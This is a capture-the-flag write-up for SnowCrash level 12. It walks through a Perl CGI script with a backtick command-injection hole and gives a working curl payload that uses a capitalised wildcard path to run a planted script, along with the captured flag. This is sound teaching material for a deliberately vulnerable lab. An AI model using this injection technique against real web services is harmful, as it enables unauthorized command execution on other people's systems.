## level 12

Logging in as the `level12` user you are greeted with these files:

```bash
level12@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
```

There is another `perl` script, `level12.pl`.
Lets take a look on what's inside: 

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

It seems like there is another server running on port `4646`, which takes two parameters `x` and `y`.
Having learned a bit of `perl` in `level04` we can see a similar exploit. There are backticks surrounding user input.
This user input is first parsed through some regex though!

The regex boils down to basically converting letters to their capitalized version and only taking the first word (something in between white spaces) from the input string.

Since the backticks are only applicable for the input of the `x` variable, we can skip anything having to do with `y`.

## Solution

Our approach was getting the `perl` script to run our own script which would simply call `getflag` and `write`.

The script looks like this:
```bash
level12@SnowCrash:~$ vim FLAGGRABBER
#!/bin/bash

getflag | write level12
```

Now the issue is, how can we bypass the capitalization of the regex found inside the `perl` script?
The name of our own script is already capitalized for this exact reason, so now the question remains, where can we store it?
Since the backticks operate as a shell we can use `wildcards` to substitute directories!
All we would have to do is find a directory both our `level12` and `flag12` user have access to.
There just so happens to be a shared memory directory, `/dev/shm` which both users can read and write to!
So saving our file in there our exploit is primed, we just have to call our script which we can do by surrounding it within its own backticks.
Nested backticks will be called first so our script will run and provide us with our token!

```bash
curl 'http://localhost:4646?x=`/*/*/FLAGGRABBER`&y=filler'
```

After URL-encoding it and sending the request we can see our flag:

```bash
curl 'http://localhost:4646?x=%60/*/*/FLAGGRABBER%60&y=HA'

Message from flag12@SnowCrash on (none) at x:x ...
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
EOF
```

The flag being: `g1qKMiRpXf53AWhDaU7FEkczr` 
